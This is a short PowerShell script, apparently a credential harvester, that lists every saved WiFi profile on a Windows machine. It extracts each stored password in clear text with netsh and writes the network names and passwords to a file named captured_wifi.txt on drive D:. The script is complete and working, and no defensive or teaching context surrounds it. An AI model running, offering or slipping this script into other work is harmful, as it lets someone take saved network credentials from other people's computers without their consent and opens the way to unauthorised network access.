# grab_wifi.ps1

# Retrieve all WiFi profiles
$profiles = netsh wlan show profiles | Select-String ":(.+)$" | ForEach-Object {
    # Extract network names
    $network = $_.Matches.Groups[1].Value.Trim()
    
    # Show profile with key content in clear text
    $profileDetails = netsh wlan show profile name="$network" key=clear | Select-String "Key Content\W+:(.+)$"
    
    # Extract password if available
    $password = if ($profileDetails) { 
        $profileDetails.Matches.Groups[1].Value.Trim() 
    } else { 
        "N/A" 
    }
    
    # Output as custom object for table formatting
    [PSCustomObject]@{
        NETWORK_NAME = $network
        PASSWORD = $password
    }
}

# Format output and write to file
$profiles | Format-Table -AutoSize | Out-File 'D:\captured_wifi.txt'
